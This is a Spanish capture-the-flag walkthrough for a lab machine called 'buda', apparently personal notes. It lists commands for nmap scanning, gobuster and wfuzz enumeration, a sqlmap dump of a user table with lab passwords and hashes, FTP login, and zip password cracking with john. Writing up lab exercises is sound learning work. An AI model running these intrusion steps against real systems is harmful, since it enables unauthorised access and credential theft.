
Vamos A realiza la maquina buda ya que esta maquina tiene de todo 
como primer paso vamos a realizar  un reconocimiento 
```
nmap -sV -sC 192.168.100.163
```
![[Pasted image 20260927011812.png]]

y vemos que tenemos pagina web realizamos el siguiente comando 
con la herramienta gobuster 
```
gobuster dir -u http://192.168.100.162 -w /usr/share/wordlists/dirb/common.txt  
```
![[Pasted image 20260927012643.png]]
encontramos los siguiente dominio 

![[Pasted image 20260927013140.png]]
y ingresamos lo siguiente  nano /etc/hosts 


![[Pasted image 20260927013333.png]]


```
gobuster dir -u http://budasec.thl/ -w /usr/share/wordlists/dirb/common.txt   
```

![[Pasted image 20260927012529.png]]

```
wfuzz -c \
-w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
-H "Host: FUZZ.budasec.thl" \
--hl 363 \
http://budasec.thl/
```
![[Pasted image 20260926212313.png]]

``` 
sqlmap -u "http://dev.budasec.thl/" --forms --dbms=mysql --dump
```

![[Pasted image 20260926214807.png]]

``` 
+----+-----------------+----------+----------------------------------------------                                                                                      ----------------+                                                                                                                                                      
| id | password        | username | hashed_password                                                                                                                                    |                                                                                                                                                      
+----+-----------------+----------+--------------------------------------------------------------+
| 1  | ftpu@sr123p@@s! | ftpuser  | $2y$10$.gKHPvTvYkWfbRxtid10s.kgGWekExh9kx.Q/QMbaKQlH/ia6xx66 |
| 4  | admin123        | admin    | $2y$10$GgGK5MsjTbGrjqkTsLXCcOD0dui1zAXhTE72lDVB.c4igQQwHdP5a |
| 5  | password1       | user1    | $2y$10$6f8FfvozmWozwY3zeFvUCutLq4421U4RqTpXIfzITrrKG4KlnqWbm |
| 6  | password2       | user2    | $2y$10$UrcCrnPw7IdNp8minBpPC.HeXiQTlJ0dmVz0hWhqUfmcmRk6GdCg6 |
+----+-----------------+----------+--------------------------------------------------------------+
```

 una ves que encontramos credenciales podemos realizar  o ingresar  al ftp  

![[Pasted image 20260927013008.png]]

nos encontramos con lo siguiente  archivo zip  y descargamos  ![[Pasted image 20260927014916.png]]

Nos pide una contraseña para descomprimir que no tenemos.
```
zip2john documents.zip > zip.hash 

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

```
realizamos los siguiente  para poder hash la clave 


![[Pasted image 20260926222436.png]]

Contraseña para descomprimir fichero zip
```
manuelito
```
unzip documents.zip

vemos el fichero audit2024


![[Pasted image 20260927015600.png]]

encontramos  credenciales 

usuario: yolanda
password: y@lAnd361!

![[Pasted image 20260926231953.png]]